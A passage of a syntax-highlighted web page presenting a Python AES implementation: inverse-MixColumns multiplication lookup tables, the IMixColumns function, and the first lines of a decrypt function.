style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0xf7</span>, <span style="color:#ae81ff">0xfc</span>, <span style="color:#ae81ff">0xe1</span>, <span style="color:#ae81ff">0xea</span>, <span style="color:#ae81ff">0xdb</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0xcd</span>, <span style="color:#ae81ff">0xc6</span>, <span style="color:#ae81ff">0xaf</span>, <span style="color:#ae81ff">0xa4</span>, <span style="color:#ae81ff">0xb9</span>, <span style="color:#ae81ff">0xb2</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x95</span>, <span style="color:#ae81ff">0x9e</span>, <span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x5a</span>, <span style="color:#ae81ff">0x6b</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x7d</span>, <span style="color:#ae81ff">0x76</span>, <span style="color:#ae81ff">0x1f</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0x9</span>, <span style="color:#ae81ff">0x2</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0x2e</span>, <span style="color:#ae81ff">0x8c</span>, <span style="color:#ae81ff">0x87</span>, <span style="color:#ae81ff">0x9a</span>, <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0xa0</span>, <span style="color:#ae81ff">0xab</span>, <span style="color:#ae81ff">0xb6</span>, <span style="color:#ae81ff">0xbd</span>, <span style="color:#ae81ff">0xd4</span>, <span style="color:#ae81ff">0xdf</span>, <span style="color:#ae81ff">0xc2</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0xf8</span>, <span style="color:#ae81ff">0xf3</span>, <span style="color:#ae81ff">0xee</span>, <span style="color:#ae81ff">0xe5</span>, <span style="color:#ae81ff">0x3c</span>, <span style="color:#ae81ff">0x37</span>, <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x1b</span>, <span style="color:#ae81ff">0x6</span>, <span style="color:#ae81ff">0xd</span>, <span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x79</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x5e</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0xa</span>, <span style="color:#ae81ff">0x17</span>, <span style="color:#ae81ff">0x1c</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x26</span>, <span style="color:#ae81ff">0x3b</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x4f</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0x7e</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0xb1</span>, <span style="color:#ae81ff">0xba</span>, <span style="color:#ae81ff">0xa7</span>, <span style="color:#ae81ff">0xac</span>, <span style="color:#ae81ff">0x9d</span>, <span style="color:#ae81ff">0x96</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xe9</span>, <span style="color:#ae81ff">0xe2</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xf4</span>, <span style="color:#ae81ff">0xc5</span>, <span style="color:#ae81ff">0xce</span>, <span style="color:#ae81ff">0xd3</span>, <span style="color:#ae81ff">0xd8</span>, <span style="color:#ae81ff">0x7a</span>, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0x6c</span>, <span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0x5d</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x4b</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x3f</span>, <span style="color:#ae81ff">0xe</span>, <span style="color:#ae81ff">0x5</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x13</span>, <span style="color:#ae81ff">0xca</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xdc</span>, <span style="color:#ae81ff">0xd7</span>, <span style="color:#ae81ff">0xe6</span>, <span style="color:#ae81ff">0xed</span>, <span style="color:#ae81ff">0xf0</span>, <span style="color:#ae81ff">0xfb</span>, <span style="color:#ae81ff">0x92</span>, <span style="color:#ae81ff">0x99</span>, <span style="color:#ae81ff">0x84</span>, <span style="color:#ae81ff">0x8f</span>, <span style="color:#ae81ff">0xbe</span>, <span style="color:#ae81ff">0xb5</span>, <span style="color:#ae81ff">0xa8</span>, <span style="color:#ae81ff">0xa3</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MULTIPLICATION_BY_13 <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0xd</span>, <span style="color:#ae81ff">0x1a</span>, <span style="color:#ae81ff">0x17</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x2e</span>, <span style="color:#ae81ff">0x23</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x7f</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0x4b</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0xdd</span>, <span style="color:#ae81ff">0xca</span>, <span style="color:#ae81ff">0xc7</span>, <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0xe9</span>, <span style="color:#ae81ff">0xfe</span>, <span style="color:#ae81ff">0xf3</span>, <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0xb5</span>, <span style="color:#ae81ff">0xa2</span>, <span style="color:#ae81ff">0xaf</span>, <span style="color:#ae81ff">0x8c</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0x96</span>, <span style="color:#ae81ff">0x9b</span>, <span style="color:#ae81ff">0xbb</span>, <span style="color:#ae81ff">0xb6</span>, <span style="color:#ae81ff">0xa1</span>, <span style="color:#ae81ff">0xac</span>, <span style="color:#ae81ff">0x8f</span>, <span style="color:#ae81ff">0x82</span>, <span style="color:#ae81ff">0x95</span>, <span style="color:#ae81ff">0x98</span>, <span style="color:#ae81ff">0xd3</span>, <span style="color:#ae81ff">0xde</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0xc4</span>, <span style="color:#ae81ff">0xe7</span>, <span style="color:#ae81ff">0xea</span>, <span style="color:#ae81ff">0xfd</span>, <span style="color:#ae81ff">0xf0</span>, <span style="color:#ae81ff">0x6b</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x3</span>, <span style="color:#ae81ff">0xe</span>, <span style="color:#ae81ff">0x19</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0x37</span>, <span style="color:#ae81ff">0x3a</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x6d</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x77</span>, <span style="color:#ae81ff">0x7a</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x4e</span>, <span style="color:#ae81ff">0x5</span>, <span style="color:#ae81ff">0x8</span>, <span style="color:#ae81ff">0x1f</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x3c</span>, <span style="color:#ae81ff">0x2b</span>, <span style="color:#ae81ff">0x26</span>, <span style="color:#ae81ff">0xbd</span>, <span style="color:#ae81ff">0xb0</span>, <span style="color:#ae81ff">0xa7</span>, <span style="color:#ae81ff">0xaa</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x84</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0x9e</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0xd8</span>, <span style="color:#ae81ff">0xcf</span>, <span style="color:#ae81ff">0xc2</span>, <span style="color:#ae81ff">0xe1</span>, <span style="color:#ae81ff">0xec</span>, <span style="color:#ae81ff">0xfb</span>, <span style="color:#ae81ff">0xf6</span>, <span style="color:#ae81ff">0xd6</span>, <span style="color:#ae81ff">0xdb</span>, <span style="color:#ae81ff">0xcc</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xe2</span>, <span style="color:#ae81ff">0xef</span>, <span style="color:#ae81ff">0xf8</span>, <span style="color:#ae81ff">0xf5</span>, <span style="color:#ae81ff">0xbe</span>, <span style="color:#ae81ff">0xb3</span>, <span style="color:#ae81ff">0xa4</span>, <span style="color:#ae81ff">0xa9</span>, <span style="color:#ae81ff">0x8a</span>, <span style="color:#ae81ff">0x87</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x9d</span>, <span style="color:#ae81ff">0x6</span>, <span style="color:#ae81ff">0xb</span>, <span style="color:#ae81ff">0x1c</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x3f</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0x6e</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x79</span>, <span style="color:#ae81ff">0x5a</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0xda</span>, <span style="color:#ae81ff">0xd7</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0xcd</span>, <span style="color:#ae81ff">0xee</span>, <span style="color:#ae81ff">0xe3</span>, <span style="color:#ae81ff">0xf4</span>, <span style="color:#ae81ff">0xf9</span>, <span style="color:#ae81ff">0xb2</span>, <span style="color:#ae81ff">0xbf</span>, <span style="color:#ae81ff">0xa8</span>, <span style="color:#ae81ff">0xa5</span>, <span style="color:#ae81ff">0x86</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x9c</span>, <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0xa</span>, <span style="color:#ae81ff">0x7</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x1d</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x78</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0x5b</span>, <span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x6c</span>, <span style="color:#ae81ff">0x7b</span>, <span style="color:#ae81ff">0x76</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x4f</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x9</span>, <span style="color:#ae81ff">0x4</span>, <span style="color:#ae81ff">0x13</span>, <span style="color:#ae81ff">0x1e</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0xb1</span>, <span style="color:#ae81ff">0xbc</span>, <span style="color:#ae81ff">0xab</span>, <span style="color:#ae81ff">0xa6</span>, <span style="color:#ae81ff">0x85</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x9f</span>, <span style="color:#ae81ff">0x92</span>, <span style="color:#ae81ff">0xd9</span>, <span style="color:#ae81ff">0xd4</span>, <span style="color:#ae81ff">0xc3</span>, <span style="color:#ae81ff">0xce</span>, <span style="color:#ae81ff">0xed</span>, <span style="color:#ae81ff">0xe0</span>, <span style="color:#ae81ff">0xf7</span>, <span style="color:#ae81ff">0xfa</span>, <span style="color:#ae81ff">0xb7</span>, <span style="color:#ae81ff">0xba</span>, <span style="color:#ae81ff">0xad</span>, <span style="color:#ae81ff">0xa0</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0x8e</span>, <span style="color:#ae81ff">0x99</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0xdf</span>, <span style="color:#ae81ff">0xd2</span>, <span style="color:#ae81ff">0xc5</span>, <span style="color:#ae81ff">0xc8</span>, <span style="color:#ae81ff">0xeb</span>, <span style="color:#ae81ff">0xe6</span>, <span style="color:#ae81ff">0xf1</span>, <span style="color:#ae81ff">0xfc</span>, <span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x6a</span>, <span style="color:#ae81ff">0x7d</span>, <span style="color:#ae81ff">0x70</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x5e</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0xf</span>, <span style="color:#ae81ff">0x2</span>, <span style="color:#ae81ff">0x15</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x3b</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0xc</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x16</span>, <span style="color:#ae81ff">0x1b</span>, <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x7e</span>, <span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x5d</span>, <span style="color:#ae81ff">0x4a</span>, <span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0xdc</span>, <span style="color:#ae81ff">0xd1</span>, <span style="color:#ae81ff">0xc6</span>, <span style="color:#ae81ff">0xcb</span>, <span style="color:#ae81ff">0xe8</span>, <span style="color:#ae81ff">0xe5</span>, <span style="color:#ae81ff">0xf2</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xb4</span>, <span style="color:#ae81ff">0xb9</span>, <span style="color:#ae81ff">0xae</span>, <span style="color:#ae81ff">0xa3</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x8d</span>, <span style="color:#ae81ff">0x9a</span>, <span style="color:#ae81ff">0x97</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MULTIPLICATION_BY_14 <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x0</span>, <span style="color:#ae81ff">0xe</span>, <span style="color:#ae81ff">0x1c</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0x70</span>, <span style="color:#ae81ff">0x7e</span>, <span style="color:#ae81ff">0x6c</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x5a</span>, <span style="color:#ae81ff">0xe0</span>, <span style="color:#ae81ff">0xee</span>, <span style="color:#ae81ff">0xfc</span>, <span style="color:#ae81ff">0xf2</span>, <span style="color:#ae81ff">0xd8</span>, <span style="color:#ae81ff">0xd6</span>, <span style="color:#ae81ff">0xc4</span>, <span style="color:#ae81ff">0xca</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x9e</span>, <span style="color:#ae81ff">0x8c</span>, <span style="color:#ae81ff">0x82</span>, <span style="color:#ae81ff">0xa8</span>, <span style="color:#ae81ff">0xa6</span>, <span style="color:#ae81ff">0xb4</span>, <span style="color:#ae81ff">0xba</span>, <span style="color:#ae81ff">0xdb</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0xc7</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0xe3</span>, <span style="color:#ae81ff">0xed</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xf1</span>, <span style="color:#ae81ff">0xab</span>, <span style="color:#ae81ff">0xa5</span>, <span style="color:#ae81ff">0xb7</span>, <span style="color:#ae81ff">0xb9</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0x9d</span>, <span style="color:#ae81ff">0x8f</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0x3b</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x3</span>, <span style="color:#ae81ff">0xd</span>, <span style="color:#ae81ff">0x1f</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x4b</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x73</span>, <span style="color:#ae81ff">0x7d</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0xad</span>, <span style="color:#ae81ff">0xa3</span>, <span style="color:#ae81ff">0xb1</span>, <span style="color:#ae81ff">0xbf</span>, <span style="color:#ae81ff">0x95</span>, <span style="color:#ae81ff">0x9b</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x87</span>, <span style="color:#ae81ff">0xdd</span>, <span style="color:#ae81ff">0xd3</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xcf</span>, <span style="color:#ae81ff">0xe5</span>, <span style="color:#ae81ff">0xeb</span>, <span style="color:#ae81ff">0xf9</span>, <span style="color:#ae81ff">0xf7</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0x7b</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x33</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x5</span>, <span style="color:#ae81ff">0xb</span>, <span style="color:#ae81ff">0x19</span>, <span style="color:#ae81ff">0x17</span>, <span style="color:#ae81ff">0x76</span>, <span style="color:#ae81ff">0x78</span>, <span style="color:#ae81ff">0x6a</span>, <span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x4e</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x6</span>, <span style="color:#ae81ff">0x8</span>, <span style="color:#ae81ff">0x1a</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x22</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x96</span>, <span style="color:#ae81ff">0x98</span>, <span style="color:#ae81ff">0x8a</span>, <span style="color:#ae81ff">0x84</span>, <span style="color:#ae81ff">0xae</span>, <span style="color:#ae81ff">0xa0</span>, <span style="color:#ae81ff">0xb2</span>, <span style="color:#ae81ff">0xbc</span>, <span style="color:#ae81ff">0xe6</span>, <span style="color:#ae81ff">0xe8</span>, <span style="color:#ae81ff">0xfa</span>, <span style="color:#ae81ff">0xf4</span>, <span style="color:#ae81ff">0xde</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0xc2</span>, <span style="color:#ae81ff">0xcc</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x4f</span>, <span style="color:#ae81ff">0x5d</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x79</span>, <span style="color:#ae81ff">0x77</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x6b</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x3f</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x23</span>, <span style="color:#ae81ff">0x9</span>, <span style="color:#ae81ff">0x7</span>, <span style="color:#ae81ff">0x15</span>, <span style="color:#ae81ff">0x1b</span>, <span style="color:#ae81ff">0xa1</span>, <span style="color:#ae81ff">0xaf</span>, <span style="color:#ae81ff">0xbd</span>, <span style="color:#ae81ff">0xb3</span>, <span style="color:#ae81ff">0x99</span>, <span style="color:#ae81ff">0x97</span>, <span style="color:#ae81ff">0x85</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0xd1</span>, <span style="color:#ae81ff">0xdf</span>, <span style="color:#ae81ff">0xcd</span>, <span style="color:#ae81ff">0xc3</span>, <span style="color:#ae81ff">0xe9</span>, <span style="color:#ae81ff">0xe7</span>, <span style="color:#ae81ff">0xf5</span>, <span style="color:#ae81ff">0xfb</span>, <span style="color:#ae81ff">0x9a</span>, <span style="color:#ae81ff">0x94</span>, <span style="color:#ae81ff">0x86</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0xa2</span>, <span style="color:#ae81ff">0xac</span>, <span style="color:#ae81ff">0xbe</span>, <span style="color:#ae81ff">0xb0</span>, <span style="color:#ae81ff">0xea</span>, <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0xf6</span>, <span style="color:#ae81ff">0xf8</span>, <span style="color:#ae81ff">0xd2</span>, <span style="color:#ae81ff">0xdc</span>, <span style="color:#ae81ff">0xce</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0x7a</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0x5e</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0xa</span>, <span style="color:#ae81ff">0x4</span>, <span style="color:#ae81ff">0x16</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x3c</span>, <span style="color:#ae81ff">0x2e</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0xec</span>, <span style="color:#ae81ff">0xe2</span>, <span style="color:#ae81ff">0xf0</span>, <span style="color:#ae81ff">0xfe</span>, <span style="color:#ae81ff">0xd4</span>, <span style="color:#ae81ff">0xda</span>, <span style="color:#ae81ff">0xc8</span>, <span style="color:#ae81ff">0xc6</span>, <span style="color:#ae81ff">0x9c</span>, <span style="color:#ae81ff">0x92</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x8e</span>, <span style="color:#ae81ff">0xa4</span>, <span style="color:#ae81ff">0xaa</span>, <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0xb6</span>, <span style="color:#ae81ff">0xc</span>, <span style="color:#ae81ff">0x2</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x1e</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x3a</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0x26</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x6e</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x4a</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0x37</span>, <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0x2b</span>, <span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0xf</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0x13</span>, <span style="color:#ae81ff">0x1d</span>, <span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x5b</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x7f</span>, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x6d</span>, <span style="color:#ae81ff">0xd7</span>, <span style="color:#ae81ff">0xd9</span>, <span style="color:#ae81ff">0xcb</span>, <span style="color:#ae81ff">0xc5</span>, <span style="color:#ae81ff">0xef</span>, <span style="color:#ae81ff">0xe1</span>, <span style="color:#ae81ff">0xf3</span>, <span style="color:#ae81ff">0xfd</span>, <span style="color:#ae81ff">0xa7</span>, <span style="color:#ae81ff">0xa9</span>, <span style="color:#ae81ff">0xbb</span>, <span style="color:#ae81ff">0xb5</span>, <span style="color:#ae81ff">0x9f</span>, <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0x8d</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">IMixColumns</span>(state: array):
</span></span><span style="display:flex;"><span>    new_state <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>array(state, dtype<span style="color:#f92672">=</span>int)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>        a0, a1, a2, a3 <span style="color:#f92672">=</span> state[:, i]
</span></span><span style="display:flex;"><span>        new_state[<span style="color:#ae81ff">0</span>, i] <span style="color:#f92672">=</span> MULTIPLICATION_BY_14[a0] <span style="color:#f92672">^</span> MULTIPLICATION_BY_11[a1] <span style="color:#f92672">^</span> MULTIPLICATION_BY_13[a2] <span style="color:#f92672">^</span> MULTIPLICATION_BY_9[a3]
</span></span><span style="display:flex;"><span>        new_state[<span style="color:#ae81ff">1</span>, i] <span style="color:#f92672">=</span> MULTIPLICATION_BY_9[a0] <span style="color:#f92672">^</span> MULTIPLICATION_BY_14[a1] <span style="color:#f92672">^</span> MULTIPLICATION_BY_11[a2] <span style="color:#f92672">^</span> MULTIPLICATION_BY_13[a3]
</span></span><span style="display:flex;"><span>        new_state[<span style="color:#ae81ff">2</span>, i] <span style="color:#f92672">=</span> MULTIPLICATION_BY_13[a0] <span style="color:#f92672">^</span> MULTIPLICATION_BY_9[a1] <span style="color:#f92672">^</span> MULTIPLICATION_BY_14[a2] <span style="color:#f92672">^</span> MULTIPLICATION_BY_11[a3]
</span></span><span style="display:flex;"><span>        new_state[<span style="color:#ae81ff">3</span>, i] <span style="color:#f92672">=</span> MULTIPLICATION_BY_11[a0] <span style="color:#f92672">^</span> MULTIPLICATION_BY_13[a1] <span style="color:#f92672">^</span> MULTIPLICATION_BY_9[a2] <span style="color:#f92672">^</span> MULTIPLICATION_BY_14[a3]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> new_state
</span></span></code></pre></div>
</div>








<style>
  .tabs input#tab-2-3:checked ~ .tab-content-2-3 {
    display: block;
  }
</style>

<input type="radio" class="tab-input" name="tab-select-2" id="tab-2-3" />
<label for="tab-2-3" class="tab-label">Decrypt</label>
<div class="tab-content tab-content-2-3">
  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(ciphertext: bytes, key: bytes, rounds: int):
</span></span><span style="display:flex;"><span>    key_state <span style="color:#f92672">=</span> ke<span style="color:#f92672">.</span>key_expension(key, rounds<span style="color:#f92672">=</span>rounds <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    round_key <span style="color:#f92672">=</span> key_state[<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>:]
</span></span><span style="display:flex;"><span>    state <span style="color:#f92672">=</span> tostate(ciphertext)
</span></span><span style="display:flex;"><span>    state <span style="color:#f92672">=</span> addroundkey(state, round_key)
</span></span><span style="display:flex;"><span>    state <span style="color:#f92672">=</span> IShiftRows(state)
